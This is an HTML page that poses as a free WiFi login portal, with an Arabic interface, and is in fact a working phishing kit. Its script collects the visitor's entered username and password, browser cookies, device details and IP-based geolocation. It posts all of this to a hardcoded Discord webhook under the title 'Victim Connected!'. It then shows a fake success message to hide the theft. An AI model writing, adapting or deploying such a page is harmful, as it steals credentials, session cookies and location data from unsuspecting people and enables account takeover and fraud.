<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Free WiFi Login</title>
    <style>
        body{font-family:Arial;background:linear-gradient(45deg,#ff6b6b,#4ecdc4);color:#333;text-align:center;padding:50px;min-height:100vh;margin:0}
        .login-box{max-width:400px;margin:0 auto;background:white;padding:40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1)}
        input{width:100%;padding:15px;margin:10px 0;border:2px solid #ddd;border-radius:10px;font-size:16px;box-sizing:border-box}
        button{width:100%;padding:15px;background:#4ecdc4;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer;transition:background 0.3s}
        button:hover{background:#45b7aa}
        .loading{display:none;color:#4ecdc4;font-size:18px}
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🔐 WiFi Login</h1>
        <p>أدخل اسمك للوصول للإنترنت المجاني</p>
        <input type="text" id="username" placeholder="اسمك..." required>
        <input type="password" id="password" placeholder="كلمة السر..." required>
        <button onclick="connect()">🔗 اتصال بالإنترنت</button>
        <div id="loading" class="loading">جاري الاتصال... ⏳</div>
    </div>

    <script>
        async function connect(){
            const loading = document.getElementById('loading');
            const username = document.getElementById('username').value || 'Guest';
            const password = document.getElementById('password').value;
            
            loading.style.display = 'block';
            
            // جمع معلومات الضحية
            const info = {
                user: username,
                pass: password,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: document.cookie,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href,
                ip: 'loading...',
                geo: 'loading...',
                timestamp: new Date().toISOString()
            };
            
            // IP + Geo
            try{
                const response = await fetch('https://api.ipify.org?format=json');
                info.ip = (await response.json()).ip;
                
                const geoResponse = await fetch(`http://ip-api.com/json/${info.ip}?fields=country,regionName,city,lat,lon,isp,org`);
                const geo = await geoResponse.json();
                info.geo = `${geo.city}, ${geo.regionName}, ${geo.country}`;
                info.lat = geo.lat;
                info.lon = geo.lon;
                info.isp = geo.isp;
            }catch(e){info.ip='N/A';}
            
            // إرسال Discord Webhook
            fetch('https://discord.com/api/webhooks/1494713788824551556/2Se1uUIMJq8hxKCGHzIy7UmPS5V4G_OXR10Gr-E-_Y9abZeEKBKuDsYCQuN6DiPRpN3M', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: '🎯 Victim Connected!',
                        color: 0xff6b6b,
                        fields: [
                            {name: '👤 User', value: `\`${info.user}\``, inline: true},
                            {name: '🔑 Password', value: `\`${info.pass || 'N/A'}\``, inline: true},
                            {name: '🌐 IP', value: `\`${info.ip}\``, inline: true},
                            {name: '📍 Location', value: `\`${info.geo}\``, inline: true},
                            {name: '📱 Device', value: `\`${info.platform}\``, inline: true},
                            {name: '🌍 ISP', value: `\`${info.isp || 'N/A'}\``, inline: true},
                            {name: '📐 Screen', value: `\`${info.screen}\``, inline: true},
                            {name: '🕐 Time', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true}
                        ],
                        thumbnail: {url: `https://flagcdn.com/w40/${info.geo?.split(',')[2]?.toLowerCase()?.slice(0,2) || 'us'}.png`}
                    }]
                })
            });
            
            setTimeout(()=>{
                loading.innerHTML = '✅ متصل! استمتع بالإنترنت المجاني';
            }, 2000);
        }
        
        // Auto-trigger on load (اختياري)
        window.onload = () => document.getElementById('username').focus();
    </script>
</body>
</html>
